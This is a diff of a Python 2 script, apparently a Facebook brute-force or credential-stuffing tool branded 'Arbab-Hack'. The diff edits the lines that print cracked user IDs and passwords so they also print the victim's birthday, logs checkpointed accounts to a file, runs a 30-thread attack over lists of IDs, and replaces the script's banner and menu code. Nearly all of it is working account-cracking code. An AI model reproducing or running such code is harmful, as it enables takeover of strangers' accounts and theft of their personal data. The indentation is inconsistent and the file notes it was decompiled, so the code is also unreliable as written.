@@ -333,14 +333,14 @@ def pilih_mbf():
 				print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
 															
 				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
-				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
+				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n' + b['birthday']											
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
 				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				    
 				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
+				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n' + b['birthday']
 				    cek = open("out/super_cp.txt", "a")
 				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 				    cek.close()
@@ -355,14 +355,14 @@ def pilih_mbf():
 				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
 				            											
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
-				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
+				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n' + b['birthday']											
 				            oks.append(user+pass2)
                                     else:
 			                   if 'www.facebook.com' in q["error_msg"]:
 				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				               
 				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
+				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n' + b['birthday']
 				               cek = open("out/super_cp.txt", "a")
 				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 				               cek.close()
@@ -377,14 +377,14 @@ def pilih_mbf():
 						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'								
 						       									
 						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
-						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
+						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n' + b['birthday']									
 						       oks.append(user+pass3)
                                                else:
 			                               if 'www.facebook.com' in q["error_msg"]:
 				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				                           
 				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
+				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n' + b['birthday']
 				                           cek = open("out/super_cp.txt", "a")
 				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 				                           cek.close()
@@ -399,14 +399,14 @@ def pilih_mbf():
 				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
 				                                   											
 				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
-				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
+				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n' + b['birthday']											
 				                                   oks.append(user+pass4)
                                                            else:
 			                                           if 'www.facebook.com' in q["error_msg"]:
 				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				                                       
 				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
+				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n' + b['birthday']
 				                                       cek = open("out/super_cp.txt", "a")
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
@@ -421,14 +421,14 @@ def pilih_mbf():
 						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'						
 						                               							
 						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
-						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
+						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'	 + b['birthday']						
 						                               oks.append(user+pass5)	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
 				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				                                                   
 				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
+				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n' + b['birthday']
 				                                                   cek = open("out/super_cp.txt", "a")
 				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 				                                                   cek.close()
@@ -443,14 +443,14 @@ def pilih_mbf():
 				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
 				                                                           											
 				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
-				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
+				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n' + b['birthday']											
 				                                                           oks.append(user+pass6)
                                                                                    else:
 			                                                                   if 'www.facebook.com' in q["error_msg"]:
 				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				                                                               
 				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
+				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n' + b['birthday']
 				                                                               cek = open("out/super_cp.txt", "a")
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 				                                                               cek.close()
@@ -465,14 +465,14 @@ def pilih_mbf():
 									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'					
 									                               					
 									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
-									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
+									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'	 + b['birthday']	
 									                               oks.append(user+pass7)
                                                                                                else:
 			                                                                               if 'www.facebook.com' in q["error_msg"]:
 				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
 				                                                                           
 				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
+				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n' + b['birthday']
 				                                                                           cek = open("out/super_cp.txt", "a")
 				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 				                                                                           cek.close()
@@ -486,37 +486,22 @@ def pilih_mbf():
                  pass
 		
 	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mSHAHZADA-ARBAB\033[1;95m◈•▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By CyberHacker-Arbab--•◈•---»" #Dev:Arbab
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Arbab.py)↩\033[1;97m....'
-	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
-	print """
+    p.map(main, id)
+    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+    print 'Done'
+    print 'Total Ok \xe2\x80\xa2\xe2\x80\xa2 ' + str(len(oks))
+    print 'Total CP \xe2\x80\xa2\xe2\x80\xa2 ' + str(len(cp))
+    print 'CP file Stored on \xe2\x80\xa2\xe2\x80\xa2 out/crack_cp.txt'
+    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+    raw_input('\nPress Enter To Return')
+    mbf()
 
-
-░█████╗░██████╗░██████╗░░█████╗░██████╗░
-██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
-███████║██████╔╝██████╦╝███████║██████╦╝
-██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
-██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
-╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
- 
-         Checkpoint ID Open After 7 Days In Facebook Lite 
-•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ..CyberHacker-Arbab Creations.. \033[1;95m :
-•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                Checkpoint ID Open After 7 Days In Facebook Lite 
-•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ..CyberHacker-Arbab Creations.. \033[1;95m :
-•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                Facebook
-              \033[1;91mCYBER-HACKER-SHAHZADA-ARBAB"""
-	
-	
-	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
-	menu()
 
 if __name__ == '__main__':
-	login()
+    try:
+        login()
+    except (KeyError, IOError):
+        menu()
 
-	
+# global cekpoint ## Warning: Unused global
+# okay decompiling crack.pyc
